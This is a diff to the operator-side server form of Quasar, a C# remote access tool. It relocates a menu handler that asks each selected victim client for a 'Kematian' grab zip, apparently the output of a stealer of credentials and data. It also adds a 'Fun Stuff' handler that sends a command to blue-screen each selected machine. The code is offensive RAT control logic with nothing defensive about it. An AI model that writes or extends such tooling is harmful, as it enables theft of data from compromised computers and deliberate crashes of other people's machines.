@@ -534,18 +534,6 @@ namespace Quasar.Server.Forms
             }
         }
 
-        private void kematianGrabbingToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                var kematianHandler = new KematianHandler(c);
-
-                kematianHandler.RequestKematianZip();
-
-                //kematianHandler.Dispose();
-            }
-        }
-
         #endregion
 
         #region "Administration"
@@ -711,6 +699,18 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private void kematianGrabbingToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var kematianHandler = new KematianHandler(c);
+
+                kematianHandler.RequestKematianZip();
+
+                //kematianHandler.Dispose();
+            }
+        }
+
         #endregion
 
         #region "User Support"
@@ -759,6 +759,16 @@ namespace Quasar.Server.Forms
             }
         }
 
+        #endregion
+
+        #region "Fun Stuff"
+        private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoBSOD());
+            }
+        }
         #endregion
 
         private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
@@ -811,8 +821,7 @@ namespace Quasar.Server.Forms
         {
         }
 
+
         #endregion
-
-
     }
 }
